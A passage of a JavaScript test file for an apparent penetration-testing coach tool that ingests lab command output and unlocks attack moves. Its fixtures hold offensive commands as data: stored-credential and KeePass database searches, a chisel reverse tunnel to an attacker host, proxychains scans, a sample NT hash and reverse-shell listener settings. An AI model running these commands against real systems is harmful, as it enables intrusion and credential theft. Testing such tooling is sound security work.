  initEngagement(OBOL, { name: 'WinPrivescBox', target: '10.10.10.140', os: 'Windows' });

  // Stage 1: Foothold + SeBackupPrivilege + cmdkey /list + Database.kdbx
  OBOL.ingest.run({
    actionId: 'win-enum-quick',
    command: 'whoami & whoami /priv & cmdkey /list & dir /s /b C:\\Users\\*.kdbx',
    text: [
      'winbox\\dave',
      'PRIVILEGES INFORMATION',
      '----------------------',
      'Privilege Name                Description                    State',
      '============================= ============================== ========',
      'SeBackupPrivilege             Back up files and directories  Enabled',
      'SeRestorePrivilege            Restore files and directories  Enabled',
      '',
      'Currently stored credentials:',
      '    Target: Domain:interactive=WINBOX\\Administrator',
      '    Type: Domain Password',
      '    User: WINBOX\\Administrator',
      '',
      'C:\\Users\\dave\\Documents\\Database.kdbx'
    ].join('\n'),
    target: '10.10.10.140'
  });
  const fs6 = OBOL.store.factSetForTarget('10.10.10.140');
  check(fs6.has('foothold.windows'), 'Replay 6.1: whoami mints foothold.windows');
  check(fs6.has('privesc.sebackup') && fs6.has('privesc.serestore'), 'Replay 6.1: SeBackupPrivilege/SeRestorePrivilege mints privesc.sebackup and privesc.serestore');
  check(fs6.has('privesc.stored_credentials') && fs6.has('credential.candidate'), 'Replay 6.1: cmdkey /list mints privesc.stored_credentials and credential.candidate');
  check(fs6.has('loot.keepass_dump'), 'Replay 6.1: C:\\Users\\dave\\Documents\\Database.kdbx mints loot.keepass_dump');

  const coach = OBOL.coach.compute();
  const onFlowIds = coach.onFlow.map(a => a.id);
  check(onFlowIds.includes('sebackup-serestore-abuse'), 'Replay 6.2: new sebackup-serestore-abuse move unlocked');
  check(onFlowIds.includes('runas-savedcred-exec'), 'Replay 6.2: new runas-savedcred-exec move unlocked');
  check(onFlowIds.includes('keepass-dump-recover'), 'Replay 6.2: keepass-dump-recover move unlocked');

  const kpMove = coach.onFlow.find(a => a.id === 'keepass-dump-recover');
  const kpFilled = OBOL.command.fillCommand(kpMove, fs6, { params: OBOL.store.active().params, target: '10.10.10.140' }, 1);
  check(kpFilled.filled.includes('Database.kdbx'), 'Replay 6.2: keepass-dump-recover command interpolates {{kdbx_file}} with Database.kdbx');
})();

// ============================================================================
// REPLAY 7: Multi-Host Pivot (10.10.10.110 Dual-Homed -> tunnel failure guard ->
//           nmap 172.16.50.20 auto-target registration + Graph/EngMap/Chain)
// ============================================================================
(function testReplay7MultiHostPivotAndGraphModels() {
  const OBOL = createSandbox();
  const eng = initEngagement(OBOL, { name: 'PivotLab', target: '10.10.10.110', os: 'Linux' });

  // Stage 1: Dual-homed interface discovery on 10.10.10.110
  OBOL.ingest.run({
    actionId: 'local-linux-interfaces',
    command: 'id; ip -4 addr',
    text: [
      'uid=1000(pivot) gid=1000(pivot) groups=1000(pivot)',
      '2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500',
      '    inet 10.10.10.110/24 brd 10.10.10.255 scope global eth0',
      '3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500',
      '    inet 172.16.50.10/24 brd 172.16.50.255 scope global eth1'
    ].join('\n'),
    target: '10.10.10.110'
  });
  let fs7 = OBOL.store.factSetForTarget('10.10.10.110');
  check(fs7.has('host.multihomed') && fs7.has('scan.local.interfaces'), 'Replay 7.1: dual-NIC ip addr mints host.multihomed and scan.local.interfaces');

  // Stage 2: Failed tunnel attempt must NOT mint tunnel.established
  OBOL.ingest.run({
    actionId: 'chisel-socks-pivot',
    command: 'chisel client 10.10.14.5:8000 R:socks',
    text: '2026/10/27 10:00:00 client: Connecting to ws://10.10.14.5:8000\n2026/10/27 10:00:01 client: dial tcp 10.10.14.5:8000: connect: connection refused\n',
    target: '10.10.10.110'
  });
  fs7 = OBOL.store.factSetForTarget('10.10.10.110');
  check(!fs7.has('tunnel.established'), 'Replay 7.2: failed chisel client (connection refused) does not mint tunnel.established');

  // Stage 3: Nmap scan of internal host 172.16.50.20 auto-registers target in eng.targets
  OBOL.ingest.run({
    actionId: 'recon-nmap-quick',
    command: 'proxychains nmap -sT -Pn -p 135,445 172.16.50.20',
    text: [
      'Nmap scan report for 172.16.50.20',
      'Host is up (0.042s latency).',
      'PORT    STATE SERVICE',
      '135/tcp open  msrpc',
      '445/tcp open  microsoft-ds'
    ].join('\n'),
    target: '172.16.50.20'
  });
  const hasInternalTarget = (eng.targets || []).some(t => t && t.ip === '172.16.50.20');
  check(hasInternalTarget, 'Replay 7.3: ingesting nmap output for 172.16.50.20 auto-registers 172.16.50.20 in eng.targets');

  // Stage 4: Verify Engagement Map (OBOL.engmap), Graph (OBOL.graph), and Chain (OBOL.chain)
  const em = OBOL.engmap.buildEngagementGraph(eng);
  check(em.nodes.some(n => n.type === 'scope'), 'Replay 7.4: Engagement Map includes discovered internal subnet scope node');
  check(em.edges.some(e => e.kind === 'pivots-to'), 'Replay 7.4: Engagement Map includes pivots-to edge from multihomed host');

  const gm = OBOL.graph.buildGraphModel(fs7, OBOL.packs.actions(), true);
  const actionsById = {};
  OBOL.packs.actions().forEach(a => { actionsById[a.id] = a; });
  const wrongOsDone = gm.nodes.filter(n => n.type === 'action' && n.state === 'done' && actionsById[n.action_id] && Array.isArray(actionsById[n.action_id].os) && actionsById[n.action_id].os.length === 1 && actionsById[n.action_id].os[0] === 'windows');
  check(wrongOsDone.length === 0, 'Replay 7.4: buildGraphModel never marks Windows-only moves as done on a Linux host');
  const flagNode = gm.nodes.find(n => n.action_id === 'flag-hunt-linux');
  check(flagNode && flagNode.phase === 'loot', 'Replay 7.4: flag-hunt-linux is placed in phase loot (col 6), not enum');

  const chain = OBOL.chain.build({ facts: OBOL.store.factSet(), activities: eng.activities, actions: OBOL.packs.actions(), host: '10.10.10.110' });
  check(Array.isArray(chain) && chain.length > 0, 'Replay 7.4: OBOL.chain.build produces non-empty causal steps');
})();

// ============================================================================
// REPLAY 8: Unused-Fact Moves (smbv1-vuln-verify, rpc-endpoint-abuse,
//           crack-modular-hash, rsync.reachable) + Hero Operator Deck Gates
// ============================================================================
(function testReplay8UnusedFactMovesAndOperatorDeckGates() {
  const OBOL = createSandbox();
  initEngagement(OBOL, { name: 'GateAndUnusedFactBox', target: '10.10.10.210', os: 'Windows' });

  // 8.1: SMBv1 + RPC Endpoints + Modular Hash + Rsync
  OBOL.ingest.run({
    actionId: 'recon-nmap-quick',
    command: 'nmap -sC -sV -p 135,445,873 10.10.10.210',
    text: [
      'Nmap scan report for 10.10.10.210',
      'PORT    STATE SERVICE      VERSION',
      '135/tcp open  msrpc        Microsoft Windows RPC',
      '445/tcp open  microsoft-ds Windows Server 2008 R2 (SMBv1:True)',
      '873/tcp open  rsync        (protocol version 31)'
    ].join('\n'),
    target: '10.10.10.210'
  });
  OBOL.store.addFacts([
    OBOL.facts.makeFact({ kind: 'smb.smbv1', scope: 'host:10.10.10.210', value: { enabled: true } }),
    OBOL.facts.makeFact({ kind: 'rpc.endpoints', scope: 'host:10.10.10.210', value: { count: 12 } }),
    OBOL.facts.makeFact({ kind: 'hash.crackable', scope: 'host:10.10.10.210', value: { hash: '$2y$10$abcdefghijklmnopqrstuuO0123456789abcdefghijklm' } })
  ], 'test', '10.10.10.210');

  const fs8 = OBOL.store.factSetForTarget('10.10.10.210');
  check(fs8.has('rsync.reachable'), 'Replay 8.1: port 873 mints rsync.reachable');
  const coach = OBOL.coach.compute();
  const readyIds = coach.onFlow.map(a => a.id);
  check(readyIds.includes('smbv1-vuln-verify'), 'Replay 8.1: smbv1-vuln-verify unlocked by smb.smbv1 / port:445');
  check(readyIds.includes('rpc-endpoint-abuse'), 'Replay 8.1: rpc-endpoint-abuse unlocked by rpc.endpoints / port:135');
  check(readyIds.includes('crack-modular-hash'), 'Replay 8.1: crack-modular-hash unlocked by hash.crackable');
  check(readyIds.includes('recon-rsync'), 'Replay 8.1: recon-rsync unlocked by port:873');

  // 8.2: Hero Operator Deck (getOperatorDeck / buildDeck) adversarial gate checks
  check(typeof OBOL.pathChooser.getOperatorDeck === 'function', 'Replay 8.2: OBOL.pathChooser.getOperatorDeck is exported');

  function allLanes(deck) {
    return ((deck && deck.tabs) || []).reduce((acc, t) => acc.concat(t.lanes || []), []);
  }
  function allSteps(deck) {
    return allLanes(deck).reduce((acc, l) => acc.concat((l.steps || []).map(s => Object.assign({}, s, { laneId: l.id, laneStatus: l.status }))), []);
  }

  // D1: Linux web-only box (port 80 only, port 445 closed) must NOT mark SMB lanes ready
  const linuxWebFs = new OBOL.facts.FactSet([
    OBOL.facts.makeFact({ kind: 'host.os', scope: 'host:10.10.10.88', value: { os: 'linux' } }),
    OBOL.facts.makeFact({ kind: 'port:80', scope: 'host:10.10.10.88', value: { port: 80 } }),
    OBOL.facts.makeFact({ kind: 'http.reachable', scope: 'host:10.10.10.88', value: { port: 80 } })
  ]);
  const deckLinuxWeb = OBOL.pathChooser.getOperatorDeck(linuxWebFs, { target: '10.10.10.88', lhost: '10.10.14.5', lport: '4444' });
  const smbLaneOnLinuxWeb = allLanes(deckLinuxWeb).find(l => l.id === 'smb-anon' || l.id === 'smb-shares');
  check(!smbLaneOnLinuxWeb || smbLaneOnLinuxWeb.status !== 'ready', 'Replay 8.2 (D1): SMB lanes are NOT ready when port 445 is closed');

  // D2: Linux foothold without root must lock linux-root-proof
  const linuxFootFs = new OBOL.facts.FactSet([
    OBOL.facts.makeFact({ kind: 'host.os', scope: 'host:10.10.10.88', value: { os: 'linux' } }),
    OBOL.facts.makeFact({ kind: 'foothold.linux', scope: 'host:10.10.10.88', value: { user: 'www-data' } })
  ]);
  const deckLinuxFoot = OBOL.pathChooser.getOperatorDeck(linuxFootFs, { target: '10.10.10.88', lhost: '10.10.14.5', lport: '4444' });
  const linuxRootLane = allLanes(deckLinuxFoot).find(l => l.id === 'linux-root-proof');
  check(!linuxRootLane || linuxRootLane.status === 'locked', 'Replay 8.2 (D2): linux-root-proof lane is locked when only non-root foothold.linux is held');

  // D3/D4/D5/D6: Windows SMB-only box with LM:NT hash
  const winSmbFs = new OBOL.facts.FactSet([
    OBOL.facts.makeFact({ kind: 'host.os', scope: 'host:10.10.10.99', value: { os: 'windows' } }),
    OBOL.facts.makeFact({ kind: 'port:445', scope: 'host:10.10.10.99', value: { port: 445 } }),
    OBOL.facts.makeFact({ kind: 'credential.available', scope: 'host:10.10.10.99', value: { user: 'svc_test', hash: 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6' } })
  ]);
  const deckWinSmb = OBOL.pathChooser.getOperatorDeck(winSmbFs, { target: '10.10.10.99', lhost: '10.10.14.5', lport: '4444' });
  const allWinLanes = allLanes(deckWinSmb);
  const allWinSteps = allSteps(deckWinSmb);
  const userOnHostLane = allWinLanes.find(l => l.id === 'user-onhost-proof');
  check(!userOnHostLane || userOnHostLane.status === 'locked', 'Replay 8.2 (D3): user-onhost-proof lane is locked when ports 5985/3389 are closed and no shell/admin is held');
  const sshLaneOnWin = allWinLanes.find(l => l.id === 'shell-ssh');
  check(!sshLaneOnWin || sshLaneOnWin.status === 'locked', 'Replay 8.2 (D4): shell-ssh lane is not ready on a Windows host without port 22');
  const hasLinuxPersistOnWin = allWinLanes.some(l => l.id === 'persist-ssh' && l.status === 'ready');
  check(!hasLinuxPersistOnWin, 'Replay 8.2 (D5): Linux persistence lane is never ready on a Windows host');
  const hasRawLmColon = allWinSteps.some(s => (s.cmd || '').includes('aad3b435b51404ee:'));
  check(!hasRawLmColon, 'Replay 8.2 (D6): Operator Deck strips LM: prefix from NT hashes in commands');
})();

console.log('adversarial-stateful-replays-smoke: ' + passed + '/' + passed + ' checks passed across 8 multi-stage adversarial replays.');
